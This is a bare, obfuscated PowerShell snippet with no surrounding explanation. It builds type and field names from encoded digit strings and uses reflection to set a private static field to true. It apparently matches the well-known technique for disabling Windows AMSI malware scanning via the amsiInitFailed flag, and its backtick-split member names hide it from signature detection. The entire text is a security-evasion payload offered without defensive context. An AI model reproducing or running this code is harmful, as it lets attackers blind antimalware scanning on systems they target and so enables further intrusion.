$A="5492868772801748688168747280728187173688878280688776828" 
$B="1173680867656877679866880867644817687416876797271" 
[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B). 
substring(($_*2),2))})-replace " " ). 
GetField([string](38..51|%{[char][int](29+($A+$B). 
substring(($_*2),2))})-replace " ",'NonPublic,Static'). 
SetValue($null,$true) 
